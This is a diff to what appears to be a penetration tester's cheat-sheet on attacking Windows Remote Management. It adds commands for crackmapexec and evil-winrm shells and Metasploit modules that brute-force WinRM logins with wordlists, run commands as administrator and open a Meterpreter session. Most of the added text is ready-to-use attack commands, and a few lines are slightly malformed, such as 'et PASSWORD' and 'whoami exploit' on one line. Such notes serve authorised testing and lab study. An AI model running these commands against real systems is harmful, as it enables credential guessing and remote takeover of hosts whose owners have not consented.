@@ -3,6 +3,9 @@ Not enabled by default
 
 nmap default scan won't find. Either open range or ports 5985 or 5986 
 
+PORT     STATE SERVICE
+5985/tcp open  wsman
+
 #crackmapexec can brute force to get credentials or execute 
 Examples:
 >brute force
@@ -18,7 +21,7 @@ crackmapexec winrm $IP -u $USER -p $WORDLIST
 ## evil-winrm 
 Can be used to obtain a command shell
 ```bash
-evil-winrm.rb -u $IP -p $PASSWORD -i $IP
+evil-winrm.rb -u $USER -p $PASSWORD -i $IP
 ```
 
 
@@ -32,3 +35,28 @@ winrm cmd will allow executing commands.
 Script to exploit winRM, meterpreter, and migrate/elevate privs. Needs credentials
 `/windows/winrm/winrm_script_exec`
 
+Brute force with metasploit:
+```bash
+msfconsole -q use auxiliary/scanner/winrm/winrm_login 
+set RHOSTS $IP
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt 
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+```
+
+Execute commands:
+```bash
+use auxiliary/scanner/winrm/winrm_cmd 
+set RHOSTS $IP 
+set USERNAME administrator 
+set PASSWORD tinkerbell 
+set CMD whoami exploit
+```
+
+Meterpreter session:
+```bash
+use exploit/windows/winrm/winrm_script_exec 
+set RHOSTS $IP
+set USERNAME administrator 
+et PASSWORD tinkerbell 
+set FORCE_VBS true exploit
+```
